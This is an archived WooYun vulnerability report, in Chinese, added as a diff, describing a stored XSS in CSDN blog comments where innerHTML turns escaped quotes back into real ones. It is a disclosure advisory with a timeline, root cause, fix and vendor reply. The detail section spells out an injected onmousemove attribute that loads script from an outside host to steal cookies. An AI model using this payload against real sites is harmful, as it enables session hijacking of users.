@@ -1,0 +1,212 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		CSDN XSS第三弹：忽视innerHTML特性导致xss  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		CSDN XSS第三弹：忽视innerHTML特性导致xss  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/橙夏">橙夏</a> 
+</li><li>提交时间：		2013-08-04 11:30</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-04：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-08-05：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-08-15：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-08-25：	细节向普通白帽子公开<br/>
+									2013-09-04：	细节向实习白帽子公开<br/>
+									2013-09-18：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">CSDN忽视浏览器特性而产生了漏洞，可惜无法大面积使用。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">漏洞出现在博客，读取HTML内容时没有对引号进行转义，且无长度限制，成功获取cookie。<br />
+<br />
+<br />
+<br />
+1、首先在我旧账号的博客里，发布如下两条评论（http://blog.csdn.net/llbbzh/article/details/9736979）<br />
+<br />
+</p><p class="detail"><a href="../images/04090137209077f98a93d66b3aa88a2c36c9a24c.png" target="_blank"><img src="../images/04090137209077f98a93d66b3aa88a2c36c9a24c.png" alt="01.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2、用旧账号进入博客的评论管理后台（http://write.blog.csdn.net/feedback）<br />
+<br />
+</p><p class="detail"><a href="../images/040901473dc36b6ed519e7bc78d0d2c853fee45a.png" target="_blank"><img src="../images/040901473dc36b6ed519e7bc78d0d2c853fee45a.png" alt="02.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3、可以看到test属性已成功进入HTML标签<br />
+<br />
+</p><p class="detail"><a href="../images/0409015688e792318b2bbbd9ae53f7b4ce0653fc.png" target="_blank"><img src="../images/0409015688e792318b2bbbd9ae53f7b4ce0653fc.png" alt="03.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4、和前面提交过的漏洞一样，构造代码<br />
+<br />
+&quot;<br />
+<br />
+class=&quot;MikuXSS&quot;<br />
+<br />
+onmousemove=&quot;$.getScript(&#039;http://mikuxss.sinaapp.com/NyaNya&#039;);$(&#039;.MikuXSS&#039;).hide();&quot;<br />
+<br />
+style=&quot;font-size:1px;width:100%;height:100%;position:absolute;left:0px;top:0px;cursor:default;<br />
+<br />
+</p><p class="detail"><a href="../images/040914116c1f3b0ce99e6002051c7aea611e0bf5.png" target="_blank"><img src="../images/040914116c1f3b0ce99e6002051c7aea611e0bf5.png" alt="04.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+5、这个漏洞的成因是，CSDN的博客后端向HTML输出的是UBB代码，于是前端用这一句话来处理：</p><pre><code>formatFeedback(this.innerHTML)</code></pre><p class='detail'>而虽然引号已转义为</p><pre><code>&amp;quot;</code></pre><p class='detail'>，但使用innerHTML读取文章内容时，会自动变回引号，导致过滤失效。<br />
+<br />
+</p><p class="detail"><a href="../images/0409084444a8852580836991400c6107f9195b1c.png" target="_blank"><img src="../images/0409084444a8852580836991400c6107f9195b1c.png" alt="051.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/0409164388443599ed6d72adbfb0c99528997175.png" target="_blank"><img src="../images/0409164388443599ed6d72adbfb0c99528997175.png" alt="052.png" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">用旧账号再次登录后台（实际情况中可以诱拐攻击对象进入后台）<br />
+<br />
+</p><p class="detail"><a href="../images/0409101548d604a2640921b23315affa467e60b4.png" target="_blank"><img src="../images/0409101548d604a2640921b23315affa467e60b4.png" alt="a00.png" width="600"/></a></p><p class="detail"><br />
+<br />
+成功获取cookie<br />
+<br />
+</p><p class="detail"><a href="../images/040911248bee696c9909bb28e2f40f020a6458c3.png" target="_blank"><img src="../images/040911248bee696c9909bb28e2f40f020a6458c3.png" alt="a01.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">http://csdnimg.cn/pig/blog/write/scripts/feedback.js<br />
+<br />
+把第10行的</p><pre><code>this.innerHTML = formatFeedback(this.innerHTML);</code></pre><p class='detail'>改为</p><pre><code>this.innerHTML = formatFeedback(this.innerHTML.replace(&quot;\&quot;&quot;,&quot;&amp;quot;&quot;));//只有一个反斜线。</code></pre><p class='detail'> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/橙夏" title="橙夏">橙夏</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-033448" title="CSDN XSS第三弹：忽视innerHTML特性导致xss">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-08-05 09:35</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">尽快修复</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-08-05：已经修复漏洞，感谢。</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="33448";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
